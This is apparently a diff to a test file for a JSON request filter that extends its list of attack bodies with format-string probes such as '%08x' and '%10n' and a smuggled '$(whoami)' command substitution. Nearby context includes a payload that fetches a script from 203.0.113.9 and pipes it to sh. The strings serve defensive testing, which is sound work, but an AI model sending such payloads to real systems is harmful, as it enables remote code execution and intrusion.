@@ -220,6 +220,13 @@ attacks = [
     b'{"c":"$(curl -s http://203.0.113.9/x|sh)"}',                # command substitution
     b'{"a":1}{"b":2}',                                            # 2 JSON texts on one line
     b"[" * 70 + b"]" * 69,                                        # unbalanced
+    # format strings with a width (review 2, F1): not URL escapes
+    b'{"q":"%08x%08x%08x%08x"}',
+    b'{"q":"AAAA%08x.%08x.%08x.%08x"}',
+    b'{"q":"%10x%10x%10x"}',
+    b'{"q":"%20s%20s"}',
+    b'{"q":"AAAA%10n"}',
+    b'{"f":"$(whoami).log"}',                                     # not jQuery (review 2, F6)
 ]
 for i, body in enumerate(benign + attacks):
     a = Conn(c, 48000 + i)
